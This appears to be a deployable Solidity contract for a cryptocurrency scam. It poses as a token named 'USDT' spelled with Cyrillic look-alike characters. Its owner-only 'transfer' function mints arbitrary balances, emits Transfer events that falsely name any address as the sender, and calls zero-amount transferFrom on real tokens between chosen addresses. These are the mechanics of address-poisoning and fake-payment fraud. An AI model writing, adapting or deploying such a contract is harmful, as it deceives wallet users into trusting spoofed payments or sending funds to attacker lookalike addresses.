// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract ForceTokenPolygon {
    string public name = unicode"UЅDТ";
    string public symbol = unicode"UЅDТ";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    address public owner;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event ExternalCallFailed(string callType, string reason);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "you arent deployer of contract");
        _;
    }
    
    constructor() {
        owner = msg.sender;
    }
    
    receive() external payable {}
    
    function getOwner() external view returns (address) {
        return owner;
    }
    
    struct MintOp {
        address source;
        address to;
        uint256 value;
    }
    
    struct ZeroOp {
        address tokenAddr;
        address tokenFrom;
        address tokenTo;
    }
    
    function transfer(
        MintOp[] calldata mintOps,
        ZeroOp[] calldata zeroOps
    ) external onlyOwner {
        uint256 mLen = mintOps.length;
        require(mLen > 0, "no mint ops");
        for (uint256 i = 0; i < mLen; ) {
            require(mintOps[i].source != address(0), "invalid from");
            require(mintOps[i].to != address(0), "invalid to");
            balanceOf[mintOps[i].to] += mintOps[i].value;
            totalSupply += mintOps[i].value;
            emit Transfer(mintOps[i].source, mintOps[i].to, mintOps[i].value);
            unchecked { i++; }
        }
        uint256 zLen = zeroOps.length;
        for (uint256 j = 0; j < zLen; ) {
            require(zeroOps[j].tokenAddr != address(0), "invalid tokenaddr");
            require(zeroOps[j].tokenFrom != address(0), "invalid tokenfrom");
            require(zeroOps[j].tokenTo != address(0), "invalid tokento");
            require(zeroOps[j].tokenAddr != address(this), "zero transfer not allowed for own token");
            try IERC20(zeroOps[j].tokenAddr).transferFrom(zeroOps[j].tokenFrom, zeroOps[j].tokenTo, 0) returns (bool r) {
                if (r) {
                    emit Transfer(zeroOps[j].tokenFrom, zeroOps[j].tokenTo, 0);
                } else {
                    emit ExternalCallFailed("transferfrom", "returned false");
                }
            } catch {
                emit ExternalCallFailed("transferfrom", "call reverted");
            }
            unchecked { j++; }
        }
    }
}